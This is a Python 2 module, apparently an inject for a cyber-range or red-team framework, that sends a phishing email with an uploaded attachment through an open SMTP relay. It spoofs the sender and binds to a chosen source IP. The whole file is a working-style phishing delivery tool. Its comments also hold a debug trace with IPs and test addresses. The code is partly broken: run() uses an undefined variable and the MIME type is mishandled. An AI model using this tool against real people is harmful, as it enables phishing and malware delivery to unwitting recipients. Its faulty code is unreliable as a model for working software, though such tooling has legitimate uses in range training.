import email,email.encoders,email.mime.text,email.mime.base
import mimetypes, base64
import traceback
import imp
import smtplibCustom

class phishing():
    def __init__(self):
        self.variables = {'src_ip': '', 'open_relay':'', 'from': '', 'to':'',
                'subject':'', 'body':'', 'attachment_FILE': '', 'filename':''}
        self.canSave = True
        self.name = "Malicious Email Attachment sender"
        self.description = "An inject to send a phishing email with an attachment using an open relay"

    #def getRangeC2Arguments(self):
        #return [(C2Module.ArgTypes.RANGEC2_MALICIOUS_IP,None), (C2Module.ArgTypes.RANGEC2_MALICIOUS_PORT,None), "Open relay IP", "From", "To", "Subject", (C2Module.ArgTypes.TEXTAREA,"Message"), "Attachment name", (C2Module.ArgTypes.UPLOAD,"File")]

    def range(self, **kwargs):
        relayIp = kwargs['open_relay']
        emailFrom = kwargs['from']
        emailTo = kwargs['to']
        subject = kwargs['subject']
        body = kwargs['body']
        filename = kwargs['filename']
        attachment = kwargs['attachment_FILE'] # text/plain;base64,aGVsbG8sIHdvcmxkIQ==
        attachment = base64.decodestring(attachment.split(',')[1])
        mimetype = mimetypes.guess_type(filename)       # [0].split('/')
        sourceAddr = kwargs['src_ip']
        sourcePort = 0
        sourceDomain = emailFrom.split('@')[1]

        # create html email
        html = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" '
        html +='"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml">'
        html +='<body style="font-size:12px;font-family:Verdana">'
        html += body
        html += "</body></html>"
        emailMsg = email.MIMEMultipart.MIMEMultipart('alternative')
        emailMsg['Subject'] = subject
        emailMsg['From'] = emailFrom
        emailMsg['To'] = emailTo
        emailMsg.attach(email.mime.text.MIMEText(html,'html'))

        # now attach the file
        fileMsg = email.mime.base.MIMEBase(mimetype[0], mimetype[1])
        fileMsg.set_payload(attachment)
        email.encoders.encode_base64(fileMsg)
        fileMsg.add_header('Content-Disposition','attachment;filename='+filename)
        emailMsg.attach(fileMsg)

        #Forking for the inject with args: [10142, u'56.127.134.94', u'172.16.60.23', u'test@test.com', u'administrator@uct.jcor', u'test message', u'the is the body', u'test attachment', u'text/plain;base64,YTtsc2tkamZhO3NrbGRqZjthbHNkams7YXNsa2pkZmFzZGY=']!
        #From child process: ERROR: smtp requestcoercing to Unicode: need string or buffer, int found

        # send email
        try:
           server = smtplibCustom.SMTP(relayIp, local_hostname=sourceDomain, bindhost=sourceAddr, bindport=sourcePort)
           server.sendmail(emailFrom,emailTo,emailMsg.as_string())
           server.quit()
        except Exception as e:
            return "ERROR: smtp request {}\n{}".format(str(e), traceback.format_exc())


    def run(self, *args):
        self.range(**kwargs)
